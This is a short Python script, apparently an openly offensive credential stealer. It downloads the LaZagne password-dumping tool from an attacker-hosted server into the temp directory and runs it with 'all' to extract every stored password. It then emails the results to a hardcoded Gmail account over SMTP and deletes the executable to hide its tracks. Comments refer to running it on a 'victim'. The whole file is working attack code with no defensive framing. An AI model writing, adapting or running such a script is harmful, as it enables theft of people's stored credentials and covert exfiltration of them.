
import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):

	get_request = requests.get(url)
	#print (get_request.content)
	#print (get_request)

	with open("lazagne.exe","w") as file:
		file.write(get_request.content)

def send_mail(email,password,message):

	server = smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://localhost where lazagne .exe is stored")
#host lazagne.exe on webserver put that link to download the lazagne.exe or
#copy the lazagne.exe to victim and run his script in that path
result = subprocess.check_output("lazagne.exe all",shell=True)
send_mail("mail@gmail.com","password",result)
os.remove("lazagne.exe")